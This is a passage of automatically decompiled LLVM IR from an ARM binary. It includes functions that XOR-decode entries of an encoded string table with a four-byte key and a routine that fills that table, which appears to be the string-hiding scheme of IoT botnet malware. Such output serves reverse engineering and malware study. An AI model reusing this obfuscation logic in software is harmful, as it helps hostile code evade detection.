  uselistorder i32 ptrtoint (i8** @global_var_21330.198 to i32), { 2, 10, 3, 1, 0, 9, 4, 8, 7, 6, 5 }
  uselistorder i32 1023, { 2, 0, 1, 3, 4 }
  uselistorder i32 ()* @function_f700, { 68, 13, 12, 11, 10, 9, 8, 65, 67, 66, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 7, 6, 5, 4, 3, 2, 17, 16, 15, 14, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_138fc, { 2, 10, 9, 8, 7, 6, 5, 4, 1, 3, 0 }
  uselistorder i32 2048, { 11, 10, 5, 6, 7, 1, 2, 3, 4, 8, 0, 9, 12 }
  uselistorder i32* @global_var_233b4.196, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 127, { 7, 2, 8, 3, 9, 10, 0, 11, 5, 12, 1, 13, 4, 14, 6, 15 }
  uselistorder i32* @global_var_233b0.194, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 288, { 2, 3, 6, 0, 1, 4, 5, 7 }
  uselistorder i32* @global_var_21360.183, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder i32 (i32*)* @function_12d98, { 4, 5, 6, 0, 1, 2, 3, 7, 8, 9 }
  uselistorder i32* @global_var_23394.88, { 2, 3, 1, 0, 4, 5, 6, 7, 8, 9, 12, 10, 11 }
  uselistorder i32* @global_var_233b8.181, { 0, 2, 1 }
  uselistorder i32 ()* @function_12e08, { 5, 2, 3, 4, 1, 0 }
  uselistorder label %bb418, { 1, 0 }
  uselistorder label %dec_label_pc_11ac0, { 1, 0 }
  uselistorder label %dec_label_pc_11ab8, { 1, 0 }
  uselistorder label %dec_label_pc_11a18, { 1, 0 }
  uselistorder label %dec_label_pc_11840, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11734, { 1, 0 }
  uselistorder label %dec_label_pc_11730, { 1, 2, 3, 0, 4, 6, 7, 5 }
  uselistorder label %dec_label_pc_116f8, { 1, 0 }
  uselistorder label %dec_label_pc_116f4, { 1, 2, 3, 4, 0, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_116e4, { 1, 0 }
  uselistorder label %dec_label_pc_11670, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %.thread108, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1163c, { 1, 0 }
  uselistorder label %.thread104, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1161c, { 1, 0 }
  uselistorder label %dec_label_pc_11608, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_115c4, { 1, 0 }
  uselistorder label %dec_label_pc_115c4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_11580, { 1, 0 }
  uselistorder label %dec_label_pc_11510, { 7, 4, 5, 6, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_114e4, { 1, 0 }
  uselistorder label %dec_label_pc_11418, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_11400, { 1, 0 }
  uselistorder label %dec_label_pc_11344, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_1132c, { 1, 0 }
  uselistorder label %dec_label_pc_11270, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_11258, { 1, 0 }
  uselistorder label %dec_label_pc_11098, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_11080, { 1, 0 }
  uselistorder label %dec_label_pc_10fc4, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_10fac, { 1, 0 }
  uselistorder label %dec_label_pc_10e90, { 6, 7, 3, 1, 0, 2, 4, 5 }
  uselistorder label %bb381, { 1, 0 }
  uselistorder label %bb379, { 1, 0 }
  uselistorder label %dec_label_pc_10e58, { 1, 0 }
  uselistorder label %dec_label_pc_10dec, { 1, 0 }
  uselistorder label %.thread62, { 1, 0 }
  uselistorder label %dec_label_pc_10d9c, { 1, 0 }
  uselistorder label %dec_label_pc_10d8c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10d84thread-pre-split.thread512, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_10d84thread-pre-split.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10d8c.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_10d80.loopexit, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10d68, { 1, 0 }
  uselistorder label %dec_label_pc_10cbc, { 1, 0 }
  uselistorder label %bb375, { 1, 0 }
  uselistorder label %bb373, { 1, 0 }
  uselistorder label %bb371, { 1, 0 }
  uselistorder label %bb369, { 4, 3, 0, 1, 2, 6, 5 }
  uselistorder label %dec_label_pc_10bb0.dec_label_pc_10bb0_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10b8c.dec_label_pc_10b8c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10b80, { 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10b78, { 1, 0 }
  uselistorder label %dec_label_pc_10b54, { 1, 0 }
  uselistorder label %dec_label_pc_10b30, { 1, 0 }
  uselistorder label %dec_label_pc_109e0, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_109cc, { 1, 0 }
  uselistorder label %bb366, { 1, 0 }
  uselistorder label %dec_label_pc_10858, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10834, { 1, 0 }
  uselistorder label %dec_label_pc_10828, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10804, { 1, 2, 0 }
  uselistorder label %dec_label_pc_107e0, { 1, 0 }
  uselistorder label %bb340, { 1, 0 }
  uselistorder label %dec_label_pc_1078c, { 22, 6, 7, 2, 8, 3, 9, 4, 10, 5, 11, 0, 12, 13, 14, 15, 16, 17, 18, 19, 1, 20, 21, 23 }
  uselistorder label %dec_label_pc_102a0, { 1, 0 }
}

define i32 @function_11b24(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_11b24:
  store i32 ptrtoint (i32* @global_var_233c0.328 to i32), i32* @r2, align 4
  %v3_11b28 = mul i32 %arg1, 8
  %v2_11b2c = add i32 %v3_11b28, ptrtoint (i32* @global_var_233c0.328 to i32)
  store i32 %v2_11b2c, i32* @r3, align 4
  %v2_11b30 = icmp eq i32* %arg2, null
  br i1 %v2_11b30, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_11b24
  %v3_11b384 = inttoptr i32 %v2_11b2c to i32*
  %v4_11b385 = load i32, i32* %v3_11b384, align 4
  br label %bb7

bb:                                               ; preds = %dec_label_pc_11b24
  %v2_11b34 = add i32 %v3_11b28, add (i32 ptrtoint (i32* @global_var_233c0.328 to i32), i32 4)
  %v3_11b34 = inttoptr i32 %v2_11b34 to i16*
  %v4_11b34 = load i16, i16* %v3_11b34, align 4
  %v5_11b34 = zext i16 %v4_11b34 to i32
  store i32 %v5_11b34, i32* @r3, align 4
  %v3_11b38 = inttoptr i32 %v2_11b2c to i32*
  %v4_11b38 = load i32, i32* %v3_11b38, align 4
  store i32 %v5_11b34, i32* %arg2, align 4
  br label %bb7

bb7:                                              ; preds = %.thread, %bb
  %v4_11b386 = phi i32 [ %v4_11b385, %.thread ], [ %v4_11b38, %bb ]
  ret i32 %v4_11b386

; uselistorder directives
  uselistorder i32 %v2_11b2c, { 1, 0, 2 }
  uselistorder i32 %v3_11b28, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @function_11b48(i32 %arg1) local_unnamed_addr {
dec_label_pc_11b48:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11b50 = mul i32 %arg1, 8
  %v2_11b54 = add i32 %v3_11b50, ptrtoint (i32* @global_var_233c0.328 to i32)
  %v2_11b58 = load i32, i32* inttoptr (i32 135476 to i32*), align 4
  %v1_11b5c = add i32 %v3_11b50, add (i32 ptrtoint (i32* @global_var_233c0.328 to i32), i32 4)
  %v2_11b5c = inttoptr i32 %v1_11b5c to i16*
  %v3_11b5c = load i16, i16* %v2_11b5c, align 4
  %v3_11b60 = udiv i32 %v2_11b58, 256
  %v2_11b64 = icmp eq i16 %v3_11b5c, 0
  %v3_11b68 = udiv i32 %v2_11b58, 65536
  store i32 %v3_11b68, i32* @r3, align 4
  %v3_11b6c = load i32, i32* @r4, align 4
  store i32 %v3_11b6c, i32* %stack_var_-16, align 4
  %v1_11b70 = urem i32 %v3_11b60, 256
  store i32 %v1_11b70, i32* %r6.global-to-local, align 4
  %v1_11b74 = urem i32 %v3_11b68, 256
  store i32 %v1_11b74, i32* %r5.global-to-local, align 4
  %v3_11b78 = udiv i32 %v2_11b58, 16777216
  store i32 %v3_11b78, i32* %r4.global-to-local, align 4
  %v1_11b7c = urem i32 %v2_11b58, 256
  store i32 %v1_11b7c, i32* %lr.global-to-local, align 4
  br i1 %v2_11b64, label %dec_label_pc_11bd8, label %dec_label_pc_11b84

dec_label_pc_11b84:                               ; preds = %dec_label_pc_11b48
  store i32 0, i32* @ip, align 4
  %v1_11b88 = inttoptr i32 %v2_11b54 to i32*
  br label %dec_label_pc_11b88

dec_label_pc_11b88:                               ; preds = %dec_label_pc_11b88.dec_label_pc_11b88_crit_edge, %dec_label_pc_11b84
  %v0_11b90 = phi i32 [ %v0_11b90.pre, %dec_label_pc_11b88.dec_label_pc_11b88_crit_edge ], [ %v1_11b7c, %dec_label_pc_11b84 ]
  %v2_11b94 = phi i32 [ %v1_11bcc, %dec_label_pc_11b88.dec_label_pc_11b88_crit_edge ], [ 0, %dec_label_pc_11b84 ]
  %v2_11b88 = load i32, i32* %v1_11b88, align 4
  %v2_11b8c = add i32 %v2_11b88, %v2_11b94
  %v3_11b8c = inttoptr i32 %v2_11b8c to i8*
  %v4_11b8c = load i8, i8* %v3_11b8c, align 1
  %v6_11b8c = zext i8 %v4_11b8c to i32
  %v2_11b90 = xor i32 %v6_11b8c, %v0_11b90
  %v1_11b94 = trunc i32 %v2_11b90 to i8
  store i8 %v1_11b94, i8* %v3_11b8c, align 1
  %v2_11b98 = load i32, i32* %v1_11b88, align 4
  %v0_11b9c = load i32, i32* @ip, align 4
  %v2_11b9c = add i32 %v0_11b9c, %v2_11b98
  %v3_11b9c = inttoptr i32 %v2_11b9c to i8*
  %v4_11b9c = load i8, i8* %v3_11b9c, align 1
  %v6_11b9c = zext i8 %v4_11b9c to i32
  %v0_11ba0 = load i32, i32* %r6.global-to-local, align 4
  %v2_11ba0 = xor i32 %v0_11ba0, %v6_11b9c
  %v1_11ba4 = trunc i32 %v2_11ba0 to i8
  store i8 %v1_11ba4, i8* %v3_11b9c, align 1
  %v2_11ba8 = load i32, i32* %v1_11b88, align 4
  %v0_11bac = load i32, i32* @ip, align 4
  %v2_11bac = add i32 %v0_11bac, %v2_11ba8
  %v3_11bac = inttoptr i32 %v2_11bac to i8*
  %v4_11bac = load i8, i8* %v3_11bac, align 1
  %v6_11bac = zext i8 %v4_11bac to i32
  %v0_11bb0 = load i32, i32* %r5.global-to-local, align 4
  %v2_11bb0 = xor i32 %v0_11bb0, %v6_11bac
  %v1_11bb4 = trunc i32 %v2_11bb0 to i8
  store i8 %v1_11bb4, i8* %v3_11bac, align 1
  %v2_11bb8 = load i32, i32* %v1_11b88, align 4
  %v0_11bbc = load i32, i32* @ip, align 4
  %v2_11bbc = add i32 %v0_11bbc, %v2_11bb8
  %v3_11bbc = inttoptr i32 %v2_11bbc to i8*
  %v4_11bbc = load i8, i8* %v3_11bbc, align 1
  %v6_11bbc = zext i8 %v4_11bbc to i32
  %v0_11bc0 = load i32, i32* %r4.global-to-local, align 4
  %v2_11bc0 = xor i32 %v0_11bc0, %v6_11bbc
  store i32 %v2_11bc0, i32* @r3, align 4
  %v1_11bc4 = trunc i32 %v2_11bc0 to i8
  store i8 %v1_11bc4, i8* %v3_11bbc, align 1
  %v3_11bc8 = load i16, i16* %v2_11b5c, align 4
  %v4_11bc8 = zext i16 %v3_11bc8 to i32
  %v0_11bcc = load i32, i32* @ip, align 4
  %v1_11bcc = add i32 %v0_11bcc, 1
  store i32 %v1_11bcc, i32* @ip, align 4
  %v8_11bd4 = icmp sgt i32 %v4_11bc8, %v1_11bcc
  br i1 %v8_11bd4, label %dec_label_pc_11b88.dec_label_pc_11b88_crit_edge, label %dec_label_pc_11bd8.loopexit

dec_label_pc_11b88.dec_label_pc_11b88_crit_edge:  ; preds = %dec_label_pc_11b88
  %v0_11b90.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_11b88

dec_label_pc_11bd8.loopexit:                      ; preds = %dec_label_pc_11b88
  %v2_11bd8.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_11bd8

dec_label_pc_11bd8:                               ; preds = %dec_label_pc_11bd8.loopexit, %dec_label_pc_11b48
  %v2_11bd8 = phi i32 [ %v2_11bd8.pre, %dec_label_pc_11bd8.loopexit ], [ %v3_11b6c, %dec_label_pc_11b48 ]
  store i32 %v2_11bd8, i32* @r4, align 4
  ret i32 %v2_11b54

; uselistorder directives
  uselistorder i32 %v1_11bcc, { 1, 2, 0 }
  uselistorder i32 %v1_11b7c, { 1, 0 }
  uselistorder i32 %v3_11b68, { 1, 0 }
  uselistorder i32 %v2_11b58, { 3, 0, 1, 2 }
  uselistorder i32 %v2_11b54, { 1, 0 }
  uselistorder i32 %v3_11b50, { 1, 0 }
}

define i32 @function_11be8(i32 %arg1) local_unnamed_addr {
dec_label_pc_11be8:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11bf0 = mul i32 %arg1, 8
  %v2_11bf4 = add i32 %v3_11bf0, ptrtoint (i32* @global_var_233c0.328 to i32)
  %v2_11bf8 = load i32, i32* inttoptr (i32 135476 to i32*), align 4
  %v1_11bfc = add i32 %v3_11bf0, add (i32 ptrtoint (i32* @global_var_233c0.328 to i32), i32 4)
  %v2_11bfc = inttoptr i32 %v1_11bfc to i16*
  %v3_11bfc = load i16, i16* %v2_11bfc, align 4
  %v3_11c00 = udiv i32 %v2_11bf8, 256
  store i32 %v3_11c00, i32* @r2, align 4
  %v2_11c04 = icmp eq i16 %v3_11bfc, 0
  %v3_11c08 = udiv i32 %v2_11bf8, 65536
  store i32 %v3_11c08, i32* @r3, align 4
  %v3_11c0c = load i32, i32* @r4, align 4
  store i32 %v3_11c0c, i32* %stack_var_-16, align 4
  %v1_11c10 = urem i32 %v3_11c00, 256
  store i32 %v1_11c10, i32* %r6.global-to-local, align 4
  %v1_11c14 = urem i32 %v3_11c08, 256
  store i32 %v1_11c14, i32* %r5.global-to-local, align 4
  %v3_11c18 = udiv i32 %v2_11bf8, 16777216
  store i32 %v3_11c18, i32* %r4.global-to-local, align 4
  %v1_11c1c = urem i32 %v2_11bf8, 256
  store i32 %v1_11c1c, i32* %lr.global-to-local, align 4
  br i1 %v2_11c04, label %dec_label_pc_11c78, label %dec_label_pc_11c24

dec_label_pc_11c24:                               ; preds = %dec_label_pc_11be8
  store i32 0, i32* @ip, align 4
  %v1_11c28 = inttoptr i32 %v2_11bf4 to i32*
  br label %dec_label_pc_11c28

dec_label_pc_11c28:                               ; preds = %dec_label_pc_11c28.dec_label_pc_11c28_crit_edge, %dec_label_pc_11c24
  %v0_11c30 = phi i32 [ %v0_11c30.pre, %dec_label_pc_11c28.dec_label_pc_11c28_crit_edge ], [ %v1_11c1c, %dec_label_pc_11c24 ]
  %v2_11c34 = phi i32 [ %v1_11c6c, %dec_label_pc_11c28.dec_label_pc_11c28_crit_edge ], [ 0, %dec_label_pc_11c24 ]
  %v2_11c28 = load i32, i32* %v1_11c28, align 4
  %v2_11c2c = add i32 %v2_11c28, %v2_11c34
  %v3_11c2c = inttoptr i32 %v2_11c2c to i8*
  %v4_11c2c = load i8, i8* %v3_11c2c, align 1
  %v6_11c2c = zext i8 %v4_11c2c to i32
  %v2_11c30 = xor i32 %v6_11c2c, %v0_11c30
  %v1_11c34 = trunc i32 %v2_11c30 to i8
  store i8 %v1_11c34, i8* %v3_11c2c, align 1
  %v2_11c38 = load i32, i32* %v1_11c28, align 4
  %v0_11c3c = load i32, i32* @ip, align 4
  %v2_11c3c = add i32 %v0_11c3c, %v2_11c38
  %v3_11c3c = inttoptr i32 %v2_11c3c to i8*
  %v4_11c3c = load i8, i8* %v3_11c3c, align 1
  %v6_11c3c = zext i8 %v4_11c3c to i32
  %v0_11c40 = load i32, i32* %r6.global-to-local, align 4
  %v2_11c40 = xor i32 %v0_11c40, %v6_11c3c
  %v1_11c44 = trunc i32 %v2_11c40 to i8
  store i8 %v1_11c44, i8* %v3_11c3c, align 1
  %v2_11c48 = load i32, i32* %v1_11c28, align 4
  %v0_11c4c = load i32, i32* @ip, align 4
  %v2_11c4c = add i32 %v0_11c4c, %v2_11c48
  %v3_11c4c = inttoptr i32 %v2_11c4c to i8*
  %v4_11c4c = load i8, i8* %v3_11c4c, align 1
  %v6_11c4c = zext i8 %v4_11c4c to i32
  %v0_11c50 = load i32, i32* %r5.global-to-local, align 4
  %v2_11c50 = xor i32 %v0_11c50, %v6_11c4c
  %v1_11c54 = trunc i32 %v2_11c50 to i8
  store i8 %v1_11c54, i8* %v3_11c4c, align 1
  %v2_11c58 = load i32, i32* %v1_11c28, align 4
  %v0_11c5c = load i32, i32* @ip, align 4
  %v2_11c5c = add i32 %v0_11c5c, %v2_11c58
  %v3_11c5c = inttoptr i32 %v2_11c5c to i8*
  %v4_11c5c = load i8, i8* %v3_11c5c, align 1
  %v6_11c5c = zext i8 %v4_11c5c to i32
  %v0_11c60 = load i32, i32* %r4.global-to-local, align 4
  %v2_11c60 = xor i32 %v0_11c60, %v6_11c5c
  store i32 %v2_11c60, i32* @r3, align 4
  %v1_11c64 = trunc i32 %v2_11c60 to i8
  store i8 %v1_11c64, i8* %v3_11c5c, align 1
  %v3_11c68 = load i16, i16* %v2_11bfc, align 4
  %v4_11c68 = zext i16 %v3_11c68 to i32
  store i32 %v4_11c68, i32* @r2, align 4
  %v0_11c6c = load i32, i32* @ip, align 4
  %v1_11c6c = add i32 %v0_11c6c, 1
  store i32 %v1_11c6c, i32* @ip, align 4
  %v8_11c74 = icmp sgt i32 %v4_11c68, %v1_11c6c
  br i1 %v8_11c74, label %dec_label_pc_11c28.dec_label_pc_11c28_crit_edge, label %dec_label_pc_11c78.loopexit

dec_label_pc_11c28.dec_label_pc_11c28_crit_edge:  ; preds = %dec_label_pc_11c28
  %v0_11c30.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_11c28

dec_label_pc_11c78.loopexit:                      ; preds = %dec_label_pc_11c28
  %v2_11c78.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_11c78

dec_label_pc_11c78:                               ; preds = %dec_label_pc_11c78.loopexit, %dec_label_pc_11be8
  %v2_11c78 = phi i32 [ %v2_11c78.pre, %dec_label_pc_11c78.loopexit ], [ %v3_11c0c, %dec_label_pc_11be8 ]
  store i32 %v2_11c78, i32* @r4, align 4
  ret i32 %v2_11bf4

; uselistorder directives
  uselistorder i32 %v1_11c6c, { 1, 2, 0 }
  uselistorder i32 %v1_11c1c, { 1, 0 }
  uselistorder i32 %v3_11c08, { 1, 0 }
  uselistorder i32 %v3_11c00, { 1, 0 }
  uselistorder i32 %v2_11bf8, { 3, 0, 1, 2 }
  uselistorder i32 %v2_11bf4, { 1, 0 }
  uselistorder i32 %v3_11bf0, { 1, 0 }
}

define i32 @function_11c84(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11c84:
  %r5.global-to-local = alloca i32, align 4
  %v0_11c84 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11c84, label %bb, label %dec_label_pc_11c84._crit_edge

bb:                                               ; preds = %dec_label_pc_11c84
  br label %dec_label_pc_11c84._crit_edge

dec_label_pc_11c84._crit_edge:                    ; preds = %dec_label_pc_11c84, %bb
  %v6_11c88 = load i32, i32* @r5, align 4
  store i32 17, i32* @r0, align 4
  %v0_11c94 = call i32 @function_13b88()
  store i32 ptrtoint (i32* @global_var_233c0.328 to i32), i32* @r4, align 4
  store i32 17, i32* @r8, align 4
  store i32 %v0_11c94, i32* @r5, align 4
  %v4_11cac = call i32 @function_124f0(i32 %v0_11c94, i32 ptrtoint ([18 x i8]* @global_var_187bc.335 to i32), i32 17)
  store i32 2, i32* @r0, align 4
  %v0_11cb4 = load i32, i32* @r5, align 4
  store i32 %v0_11cb4, i32* @global_var_233d8.336, align 4
  %v0_11cb8 = load i32, i32* @r8, align 4
  %v1_11cb8 = trunc i32 %v0_11cb8 to i16
  store i16 %v1_11cb8, i16* bitcast (i32* @global_var_233dc.337 to i16*), align 4
  %v0_11cbc = call i32 @function_13b88()
  store i32 2, i32* @r5, align 4
  store i32 %v0_11cbc, i32* @r6, align 4
  %v4_11cd0 = call i32 @function_124f0(i32 %v0_11cbc, i32 ptrtoint ([3 x i8]* @global_var_187d0.339 to i32), i32 2)
  %v0_11cd4 = load i32, i32* @r8, align 4
  store i32 %v0_11cd4, i32* @r0, align 4
  %v0_11cd8 = load i32, i32* @r6, align 4
  store i32 %v0_11cd8, i32* @global_var_233e0.340, align 4
  %v0_11cdc = load i32, i32* @r5, align 4
  %v1_11cdc = trunc i32 %v0_11cdc to i16
  store i16 %v1_11cdc, i16* bitcast (i32* @global_var_233e4.341 to i16*), align 4
  %v0_11ce0 = call i32 @function_13b88()
  %v0_11ce8 = load i32, i32* @r8, align 4
  store i32 %v0_11ce0, i32* @r6, align 4
  %v4_11cf0 = call i32 @function_124f0(i32 %v0_11ce0, i32 ptrtoint ([18 x i8]* @global_var_187d4.343 to i32), i32 %v0_11ce8)
  %v0_11cf4 = load i32, i32* @r5, align 4
  store i32 %v0_11cf4, i32* @r0, align 4
  %v0_11cf8 = load i32, i32* @r6, align 4
  store i32 %v0_11cf8, i32* @global_var_23450.344, align 4
  %v0_11cfc = load i32, i32* @r8, align 4
  %v1_11cfc = trunc i32 %v0_11cfc to i16
  store i16 %v1_11cfc, i16* bitcast (i32* @global_var_23454.345 to i16*), align 4
  %v0_11d00 = call i32 @function_13b88()
  %v0_11d04 = load i32, i32* @r5, align 4
  store i32 %v0_11d00, i32* @r6, align 4
  %v3_11d10 = call i32 @function_124f0(i32 %v0_11d00, i32 ptrtoint (i32* @global_var_187e8.347 to i32), i32 %v0_11d04)
  store i32 15, i32* @r0, align 4
  %v0_11d18 = load i32, i32* @r6, align 4
  store i32 %v0_11d18, i32* @global_var_23458.348, align 4
  %v0_11d1c = load i32, i32* @r5, align 4
  %v1_11d1c = trunc i32 %v0_11d1c to i16
  store i16 %v1_11d1c, i16* bitcast (i32* @global_var_2345c.349 to i16*), align 4
  %v0_11d20 = call i32 @function_13b88()
  store i32 %v0_11d20, i32* @r5, align 4
  %v3_11d30 = call i32 @function_124f0(i32 %v0_11d20, i32 ptrtoint (i32* @global_var_187ec.351 to i32), i32 15)
  store i32 29, i32* @r0, align 4
  %v0_11d3c = load i32, i32* @r5, align 4
  store i32 %v0_11d3c, i32* @global_var_233d0.352, align 4
  store i16 15, i16* bitcast (i32* @global_var_233d4.353 to i16*), align 4
  %v0_11d44 = call i32 @function_13b88()
  store i32 %v0_11d44, i32* @r5, align 4
  %v3_11d54 = call i32 @function_124f0(i32 %v0_11d44, i32 ptrtoint (i32* @global_var_187fc.355 to i32), i32 29)
  store i32 7, i32* @r0, align 4
  store i16 29, i16* bitcast (i32* @global_var_233ec.356 to i16*), align 4
  %v0_11d64 = load i32, i32* @r5, align 4
  store i32 %v0_11d64, i32* @global_var_233e8.357, align 4
  %v0_11d68 = call i32 @function_13b88()
  store i32 7, i32* @r6, align 4
  store i32 %v0_11d68, i32* @r5, align 4
  %v4_11d7c = call i32 @function_124f0(i32 %v0_11d68, i32 ptrtoint ([8 x i8]* @global_var_1881c.359 to i32), i32 7)
  store i32 5, i32* @r0, align 4
  %v0_11d84 = load i32, i32* @r5, align 4
  store i32 %v0_11d84, i32* @global_var_233f0.360, align 4
  %v0_11d88 = load i32, i32* @r6, align 4
  %v1_11d88 = trunc i32 %v0_11d88 to i16
  store i16 %v1_11d88, i16* bitcast (i32* @global_var_233f4.361 to i16*), align 4
  %v0_11d8c = call i32 @function_13b88()
  store i32 %v0_11d8c, i32* @r5, align 4
  %v4_11d9c = call i32 @function_124f0(i32 %v0_11d8c, i32 ptrtoint ([6 x i8]* @global_var_18824.363 to i32), i32 5)
  store i32 11, i32* @r0, align 4
  %v0_11da8 = load i32, i32* @r5, align 4
  store i32 %v0_11da8, i32* @global_var_233f8.364, align 4
  store i16 5, i16* bitcast (i32* @global_var_233fc.365 to i16*), align 4
  %v0_11db0 = call i32 @function_13b88()
  store i32 %v0_11db0, i32* @r5, align 4
  %v3_11dc0 = call i32 @function_124f0(i32 %v0_11db0, i32 ptrtoint (i32* @global_var_1882c.367 to i32), i32 11)
  store i32 4, i32* @r0, align 4
  store i16 11, i16* bitcast (i32* @global_var_23404.368 to i16*), align 4
  %v0_11dd0 = load i32, i32* @r5, align 4
  store i32 %v0_11dd0, i32* @global_var_23400.369, align 4
  %v0_11dd4 = call i32 @function_13b88()
  store i32 %v0_11dd4, i32* @r5, align 4
  %v4_11de4 = call i32 @function_124f0(i32 %v0_11dd4, i32 ptrtoint ([5 x i8]* @global_var_18838.371 to i32), i32 4)
  %v0_11dec = load i32, i32* @r6, align 4
  store i32 %v0_11dec, i32* @r0, align 4
  %v0_11df0 = load i32, i32* @r5, align 4
  store i32 %v0_11df0, i32* @global_var_23408.372, align 4
  store i16 4, i16* bitcast (i32* @global_var_2340c.373 to i16*), align 4
  %v0_11df8 = call i32 @function_13b88()
  %v0_11dfc = load i32, i32* @r6, align 4
  store i32 %v0_11df8, i32* @r5, align 4
  %v4_11e08 = call i32 @function_124f0(i32 %v0_11df8, i32 ptrtoint ([8 x i8]* @global_var_18840.375 to i32), i32 %v0_11dfc)
  store i32 8, i32* @r0, align 4
  %v0_11e10 = load i32, i32* @r5, align 4
  store i32 %v0_11e10, i32* @global_var_23410.376, align 4
  %v0_11e14 = load i32, i32* @r6, align 4
  %v1_11e14 = trunc i32 %v0_11e14 to i16
  store i16 %v1_11e14, i16* bitcast (i32* @global_var_23414.377 to i16*), align 4
  %v0_11e18 = call i32 @function_13b88()
  store i32 8, i32* @sb, align 4
  store i32 %v0_11e18, i32* @r5, align 4
  %v4_11e2c = call i32 @function_124f0(i32 %v0_11e18, i32 ptrtoint ([9 x i8]* @global_var_18848.379 to i32), i32 8)
  store i32 13, i32* @r0, align 4
  %v0_11e34 = load i32, i32* @r5, align 4
  store i32 %v0_11e34, i32* @global_var_23418.380, align 4
  %v0_11e38 = load i32, i32* @sb, align 4
  %v1_11e38 = trunc i32 %v0_11e38 to i16
  store i16 %v1_11e38, i16* bitcast (i32* @global_var_2341c.381 to i16*), align 4
  %v0_11e3c = call i32 @function_13b88()
  store i32 %v0_11e3c, i32* @r5, align 4
  %v3_11e4c = call i32 @function_124f0(i32 %v0_11e3c, i32 ptrtoint (i32* @global_var_18854.383 to i32), i32 13)
  store i32 10, i32* @r0, align 4
  store i16 13, i16* bitcast (i32* @global_var_23424.384 to i16*), align 4
  store i32 10, i32* @r7, align 4
  %v0_11e60 = load i32, i32* @r5, align 4
  store i32 %v0_11e60, i32* @global_var_23420.385, align 4
  %v0_11e64 = call i32 @function_13b88()
  %v0_11e6c = load i32, i32* @r7, align 4
  store i32 %v0_11e64, i32* @r5, align 4
  %v4_11e74 = call i32 @function_124f0(i32 %v0_11e64, i32 ptrtoint ([11 x i8]* @global_var_18864.387 to i32), i32 %v0_11e6c)
  %v0_11e78 = load i32, i32* @r7, align 4
  store i32 %v0_11e78, i32* @r0, align 4
  %v0_11e7c = load i32, i32* @r5, align 4
  store i32 %v0_11e7c, i32* @global_var_23428.388, align 4
  %v1_11e80 = trunc i32 %v0_11e78 to i16
  store i16 %v1_11e80, i16* bitcast (i32* @global_var_2342c.389 to i16*), align 4
  %v0_11e84 = call i32 @function_13b88()
  %v0_11e8c = load i32, i32* @r7, align 4
  store i32 %v0_11e84, i32* @r5, align 4
  %v4_11e94 = call i32 @function_124f0(i32 %v0_11e84, i32 ptrtoint ([11 x i8]* @global_var_18870.391 to i32), i32 %v0_11e8c)
  store i32 33, i32* @r0, align 4
  %v0_11e9c = load i32, i32* @r5, align 4
  store i32 %v0_11e9c, i32* @global_var_23430.392, align 4
  %v0_11ea0 = load i32, i32* @r7, align 4
  %v1_11ea0 = trunc i32 %v0_11ea0 to i16
  store i16 %v1_11ea0, i16* bitcast (i32* @global_var_23434.393 to i16*), align 4
  %v0_11ea4 = call i32 @function_13b88()
  store i32 %v0_11ea4, i32* @r5, align 4
  %v3_11eb4 = call i32 @function_124f0(i32 %v0_11ea4, i32 ptrtoint (i32* @global_var_1887c.395 to i32), i32 33)
  %v0_11ebc = load i32, i32* @sb, align 4
  store i32 %v0_11ebc, i32* @r0, align 4
  %v0_11ec0 = load i32, i32* @r5, align 4
  store i32 %v0_11ec0, i32* @global_var_23438.396, align 4
  store i16 33, i16* bitcast (i32* @global_var_2343c.397 to i16*), align 4
